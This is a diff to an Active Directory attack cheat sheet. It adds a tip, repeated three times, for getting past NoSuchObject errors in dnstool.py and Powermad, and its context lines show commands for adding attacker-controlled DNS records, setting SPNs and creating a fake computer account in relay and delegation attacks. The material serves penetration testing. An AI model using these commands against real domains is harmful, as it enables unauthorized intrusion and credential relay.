@@ -860,6 +860,7 @@ Set-DomainObject -Identity <USER> -Set @{serviceprincipalname='cifs/<HOSTNAME>.<
 #### Create a DNS record pointing to the attacker's machine IP
 -   https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py
 -   https://github.com/Kevin-Robertson/Powermad/blob/master/Invoke-DNSUpdate.ps1
+- When the tools throw errors like `NoSuchObject` try the `--legacy` or `--forest` with `dnstool.py` or the `-Partition` parameter from PowerMad.
 ```
 dnstool.py -u <DOMAIN>\<USER> -a add -r <HOSTNAME> -d <ATTACKER IP> <DC IP>
 
@@ -1141,6 +1142,7 @@ crackmapexec smb <HOST> -d <DOMAIN> -u <USER> -p <PASSWORD> -M webdav
 #### Create a DNS record pointing to the attacker's machine IP
 - https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py
 - https://github.com/Kevin-Robertson/Powermad/blob/master/Invoke-DNSUpdate.ps1
+- When the tools throw errors like `NoSuchObject` try the `--legacy` or `--forest` with `dnstool.py` or the `-Partition` parameter from PowerMad.
 ```
 dnstool.py -u <DOMAIN>\<USER> -a add -r <HOSTNAME> -d <ATTACKER IP> <DC IP>
 
@@ -1222,6 +1224,7 @@ python3 addcomputer.py -computer-name FAKE01 -computer-pass '123456' <DOMAIN>/<U
 #### Create a DNS record pointing to the attacker's machine IP
 - https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py
 - https://github.com/Kevin-Robertson/Powermad/blob/master/Invoke-DNSUpdate.ps1
+- When the tools throw errors like `NoSuchObject` try the `--legacy` or `--forest` with `dnstool.py` or the `-Partition` parameter from PowerMad.
 ```
 dnstool.py -u <DOMAIN>\<USER> -a add -r <HOSTNAME> -d <ATTACKER IP> <DC IP>
 
